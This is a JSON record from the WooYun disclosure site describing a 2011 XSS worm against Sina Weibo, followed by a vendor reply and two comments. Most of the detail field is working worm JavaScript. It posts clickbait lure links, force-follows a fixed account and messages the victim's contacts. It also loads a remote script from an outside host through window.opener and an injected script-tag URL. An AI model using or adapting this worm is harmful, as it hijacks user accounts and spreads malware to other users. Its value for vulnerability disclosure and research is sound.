{"id": 22609, "wybug_id": "wooyun-2011-02334", "wybug_title": "28日新浪微博XSS", "wybug_corp": "新浪", "wybug_author": "MythHack", "wybug_date": "2011-06-29 00:35", "wybug_open_date": "2011-07-04 03:00", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "类型应用", "发生点上下文敏感", "应用", "蠕虫", "发生上下文敏感"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-06-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-07-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 28日新浪微博XSS 详细说明：  \nfunction createXHR(){\treturn window.XMLHttpRequest?\tnew XMLHttpRequest():\tnew ActiveXObject(\"Microsoft.XMLHTTP\");}function getappkey(url){\txmlHttp = createXHR();\txmlHttp.open(\"GET\",url,false);\txmlHttp.send();\tresult = xmlHttp.responseText;\tid_arr = '';\tid = result.match(/namecard=\\\"true\\\" title=\\\"[^\\\"]*/g);\tfor(i=0;i<id.length;i++){\t\tsum = id[i].toString().split('\"')[3];\t\tid_arr += sum + '||';\t}\treturn id_arr;}function random_msg(){\tlink = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();;\tvar msgs = [\t\t'郭美美事件的一些未注意到的细节：',\t\t'建党大业中穿帮的地方：',\t\t'让女人心动的100句诗歌：',\t\t'3D肉团团高清普通话版种子：',\t\t'这是传说中的神仙眷侣啊：',\t\t'惊爆!范冰冰艳照真流出了：',\t\t'杨幂被爆多次被潜规则:',\t\t'傻仔拿锤子去抢银行：',\t\t'可以监听别人手机的软件：',\t\t'个税起征点有望提到4000：'];\tvar msg = msgs[Math.floor(Math.random()*msgs.length)] + link;\tmsg = encodeURIComponent(msg);\treturn msg;}function post(url,data,sync){\txmlHttp = createXHR();    xmlHttp.open(\"POST\",url,sync);    xmlHttp.setRequestHeader(\"Accept\",\"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\");    xmlHttp.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded; charset=UTF-8\");    xmlHttp.send(data);}function publish(){\turl = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime();\tdata = 'content=' + random_msg() + '&pic=&styleid=2&retcode=';\tpost(url,data,true);}function follow(){\turl = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime();\tdata = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile';\tpost(url,data,true);}function message(){\turl = 'http://weibo.com/' + $CONFIG.$uid + '/follow';\tids = getappkey(url);\tid = ids.split('||');\tfor(i=0;i<id.length - 1 & i<5;i++){\t\tmsgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime();\t\tmsg = random_msg();\t\tmsg = encodeURIComponent(msg);\t\tuser = encodeURIComponent(encodeURIComponent(id[i]));\t\tdata = 'content=' + msg + '&name=' + user + '&retcode=';\t\tpost(msgurl,data,false);\t}}function main(){\ttry{\t\tpublish();\t}\tcatch(e){}\ttry{\t\tfollow();\t}\tcatch(e){}\ttry{\t\tmessage();\t}\tcatch(e){}}try{   x=\"g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)\";window.opener.eval(x);}catch(e){}main();var t=setTimeout('location=\"http://weibo.com/pub/topic\";',5000);\n\nweibo.com/pub/star/g/xyyyd%22%3e%3cscript%20src=//www.病毒地址.cn/images/t.js%3e%3c/script%3e?type=update\n   漏洞证明：  \n\n   修复方案：  转载- -！   版权声明：转载请注明来源 MythHack@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2011-07-04 03:00 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-07-04 12:32 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  无影响厂商忽略,偷偷修复..猥琐..    \n     2012-04-14 11:20 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  感觉是CSRF    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}